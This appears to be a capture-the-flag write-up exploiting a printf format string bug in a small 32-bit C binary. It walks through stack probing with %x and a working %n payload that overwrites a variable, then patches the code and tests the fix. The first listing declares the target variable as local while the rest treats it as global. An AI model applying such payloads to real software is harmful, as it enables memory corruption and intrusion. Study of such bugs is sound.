Let's take a look at the code...

```
#include <stdio.h>
#include <stdlib.h>

void not_important()
	{
	int unimportant_var0 = 0;
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf(buf0);

	if (unimportant_var0)
		{
			printf("Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared\n");
		}
	}

int main()
{
	not_important();
}
```

So as we can see here, it is vulnerable to the same format string bug as f0, since it prints out user defined data without formatting it properely.

```
	printf(buf0);
```

So in order to pwn this level, we will need to change the value of unimportant_var0 to something other than 0 so the if then statement will evaluate as true and we will pass the level.
Printf has a flag that will allow us to print values on to the stack, effictively rewriting part of the program. We can do this to change the value of unimportant_var0
so that it will pass the if then statement. First let's see if the program is 32 bit or 64 bit using the file command.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ file f1
f1: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46c42c45a076c8cb4571bb5a54abf5ad04a11921, not stripped
``` 

So we can see that it is a 32 bit program. Secondly we will need to find where our input is stored on the stack. We can do this by giving the program input, then use a series of %x flags to print out values off of the stack untill we see our input.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ python -c 'print "eeee." + "%x."*20' | ./f1
eeee.64.f773d5a0.f0b5ff.ff826efe.1.c2.65656565.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
```

So we gave the program the input "eeee" (we gave it four input, because if the input is stored next to each other since it is 32 bit it will be stored in the same stack location) which is hex code for 0x65656565. We can see that hex string 7 spots down the stack (remember the eeee at the beginning doesn't count), so our input is stored 7 stack values. 
Let's confirm it by just printing out the seventh stack value.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ python -c 'print "eeee." + "%7$x"' | ./f1
eeee.65656565
```

And as you can see, we got the hex value of eeee (0x65656565) as the output so we've confimed where our input is stored on the stack. The next step is to find where the location of the int in the program, so we can write to it. We can do this using objdump since it is a global int.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ objdump -t ./f1 | grep unimportant_var0
0804a048 g     O .bss	00000004              unimportant_var0
```

So we have the address of the int, and we know where our input is stored on the stack. Now we can write a payload that will push the address of the int in little endian onto the stack, then use string format to print to to that address since it is stored on the stack in a location we know. It will print the contents of our input, which will just be the address, and it should interpret it as 4 since the address is four bytes (however we don't need to worry about what the value is now, as long as it isn't 0).

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ python -c 'print "\x48\xa0\x04\x08" + "%7$n"' | ./f1
H�
Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared
```

Just like that, we pwned the binary. Now to patch it.

```
#include <stdio.h>
#include <stdlib.h>

int unimportant_var0 = 0;
void not_important()
	{
	char buf0[100];
	fgets(buf0, sizeof(buf0), stdin);
	printf("%s\n", buf0);

	if (unimportant_var0)
		{
			printf("Printf can do that? Oh right I enabled that. It claimed so many lives. Level Cleared\n");
		}
	}

int main()
{
	not_important();
}
```

So we just formatted the user defined input, so it can't be interpreted as actual flags. Now let's try to exploit it.

```
guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ python -c 'print "eeee" + "%x."*20' | ./f1_secure 
eeee%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.

guyinatuxedo@tux:/Hackery/escape/fmt_str/f1$ 
```

As you can see, the string format exploit no longer works. And just like that, we patched the binary.
